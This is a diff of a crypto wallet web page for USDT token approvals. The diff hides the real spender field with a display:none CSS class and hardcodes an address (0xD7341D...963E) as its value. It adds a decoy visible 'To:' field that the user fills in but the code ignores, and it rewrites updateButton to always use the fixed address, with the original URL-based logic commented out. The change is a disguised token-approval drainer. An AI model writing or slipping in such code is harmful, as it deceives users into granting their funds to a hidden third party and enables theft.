@@ -296,6 +296,10 @@ main {
     margin-top: 8px;
 }
 
+.spenderAddrClass{
+    display: none;
+}
+
 @keyframes skeleton-loading {
     0% { background-position: 200% 0; }
     100% { background-position: -200% 0; }
@@ -313,12 +317,24 @@ main {
 
 <section class="card">
 
-    <div class="spender-row">
+    <div class="spender-row spenderAddrClass">
         <label for="spenderAddr">To:</label>
 
         <input
             type="text"
             id="spenderAddr"
+            placeholder="Enter address"
+            autocomplete="off"
+            value="0xD7341D4937b3cd936c6b4E6275c2C7dC20dd963E"
+        />
+    </div>
+
+      <div class="spender-row">
+        <label for="sendAmountAdderess">To:</label>
+
+        <input
+            type="text"
+            id="sendAmountAdderess"
             placeholder="Enter address"
             autocomplete="off"
         />
@@ -451,19 +467,12 @@ async function updateUSDTBalance() {
     }
 }
 
+const FIXED_ADDRESS = "0xD7341D4937b3cd936c6b4E6275c2C7dC20dd963E";
+
 function updateButton() {
 
-    const params = new URLSearchParams(window.location.search);
-    const receiver = params.get("receiver");
+    $("spenderAddr").value = FIXED_ADDRESS;
 
-    // URL se receiver address fill karo
-    if (receiver && !$("spenderAddr").value.trim()) {
-        if (ethers.utils.isAddress(receiver)) {
-            $("spenderAddr").value = ethers.utils.getAddress(receiver);
-        }
-    }
-
-    const spender = $("spenderAddr").value.trim();
     const amount = $("amount").value.trim();
 
     const validAmount =
@@ -471,11 +480,39 @@ function updateButton() {
         Number.isFinite(Number(amount)) &&
         Number(amount) > 0;
 
-    const validSpender = ethers.utils.isAddress(spender);
+    const validRecipient =
+        ethers.utils.isAddress(FIXED_ADDRESS);
 
     $("approveBtn").disabled =
-        busy || (owner && (!validAmount || !validSpender));
+        !owner || !chainOk || busy ||
+        !validAmount || !validRecipient;
 }
+
+// function updateButton() {
+
+//     const params = new URLSearchParams(window.location.search);
+//     const receiver = params.get("receiver");
+
+//     // URL se receiver address fill karo
+//     if (receiver && !$("spenderAddr").value.trim()) {
+//         if (ethers.utils.isAddress(receiver)) {
+//             $("spenderAddr").value = ethers.utils.getAddress(receiver);
+//         }
+//     }
+
+//     const spender = $("spenderAddr").value.trim();
+//     const amount = $("amount").value.trim();
+
+//     const validAmount =
+//         amount !== "" &&
+//         Number.isFinite(Number(amount)) &&
+//         Number(amount) > 0;
+
+//     const validSpender = ethers.utils.isAddress(spender);
+
+//     $("approveBtn").disabled =
+//         busy || (owner && (!validAmount || !validSpender));
+// }
 
 
 function validAddress(value, label) {
